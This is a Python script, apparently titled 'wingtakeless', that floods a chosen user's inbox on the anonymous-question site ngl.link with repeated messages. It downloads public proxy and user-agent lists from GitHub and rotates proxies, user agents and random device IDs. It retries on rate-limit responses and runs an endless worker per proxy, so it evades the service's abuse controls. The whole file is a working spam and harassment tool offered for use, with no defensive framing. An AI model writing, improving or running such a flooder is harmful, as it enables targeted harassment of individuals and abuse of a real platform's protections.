import os
import requests
import httpx
import uuid
import random
import asyncio


# CONFIG
BANNER = """
           _             __        __        __              
 _      __(_)___  ____ _/ /_____ _/ /_____  / /__  __________
| | /| / / / __ \/ __ `/ __/ __ `/ //_/ _ \/ / _ \/ ___/ ___/
| |/ |/ / / / / / /_/ / /_/ /_/ / ,< /  __/ /  __(__  |__  ) 
|__/|__/_/_/ /_/\__, /\__/\__,_/_/|_|\___/_/\___/____/____/  
               /____/                                         
"""

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def user_agents():
    try:
        url = "https://raw.githubusercontent.com/tamimibrahim17/List-of-user-agents/refs/heads/master/Chrome.txt"
        response = requests.get(url)
        response.raise_for_status()
        return response.text.splitlines()
    except requests.exceptions.RequestException as e:
        print(f"Error downloading user agents: {e}")
        return []

def get_https_proxies():
    try:
        url = "https://raw.githubusercontent.com/4levy/NGL-flooder/refs/heads/main/proxies_checked.txt"
        response = requests.get(url)
        response.raise_for_status()
        proxies = [line.strip() for line in response.text.splitlines() if line.strip()]
        return proxies
    except requests.exceptions.RequestException as e:
        print(f"Error downloading proxies: {e}")
        return []

async def send_message(client, target, message, agents, proxies, delay=0):
    user_agent = random.choice(agents)
    headers = {
        "User-Agent": user_agent,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = {
        "username": target,
        "question": message,
        "deviceId": str(uuid.uuid4()),
        "gameSlug": None,
        "referrer": None
    }
    proxy = None
    if proxies:
        proxy = random.choice(proxies)
        proxy_url = f"http://{proxy}"
    while True:
        try:
            if proxy:
                transport = httpx.AsyncHTTPTransport(proxy=proxy_url)
                async with httpx.AsyncClient(transport=transport) as proxy_client:
                    response = await proxy_client.post("https://ngl.link/api/submit", headers=headers, data=payload)
            else:
                response = await client.post("https://ngl.link/api/submit", headers=headers, data=payload)
            if response.status_code == 200:
                print(f"[+] Sent! - {response.status_code}")
                break
            elif response.status_code == 429:
                print(f"[!] Failed - {response.status_code} (Too Many Requests). Retrying with longer delay...")
                await asyncio.sleep(5 + random.uniform(0, 2)) 
            else:
                print(f"[!] Failed - {response.status_code}")
                break
        except Exception as e:
            print(f"[!] Error: {e}")
            break
    if delay > 0:
        await asyncio.sleep(delay)

async def spam(target, message, agents, amount, delay=0):
    async with httpx.AsyncClient() as client:
        for _ in range(amount):
            await send_message(client, target, message, agents, delay)

def feliy():
    agents = user_agents()
    if not agents:
        print("Failed to load user agents. Exiting.")
        return
    proxies = get_https_proxies()
    if not proxies:
        print("Failed to load HTTPS proxies. Continuing without proxies.")

    print(BANNER)
    print(f"\nLoaded {len(agents)} user agents\n")
    print(f"Loaded {len(proxies)} HTTPS proxies\n")

    t = input("Username target: ")
    m = input("Message: ")
    while True:
        delay_input = input("Delay between requests (seconds): ").strip()
        try:
            delay = float(delay_input.lstrip('0') or '0')
            break
        except ValueError:
            print("Invalid delay. Please enter a valid number (e.g., 2 or 0.5).")

    async def worker(client, t, m, agents, proxy, delay):
        while True:
            await send_message(client, t, m, agents, [proxy], delay)

    async def inm():
        proxies = get_https_proxies()
        async with httpx.AsyncClient() as client:
            tasks = [asyncio.create_task(worker(client, t, m, agents, proxy, delay)) for proxy in proxies]
            await asyncio.gather(*tasks)

    try:
        asyncio.run(inm())
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")

if __name__ == '__main__':
    clear()
    try:
        feliy()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user during input.")
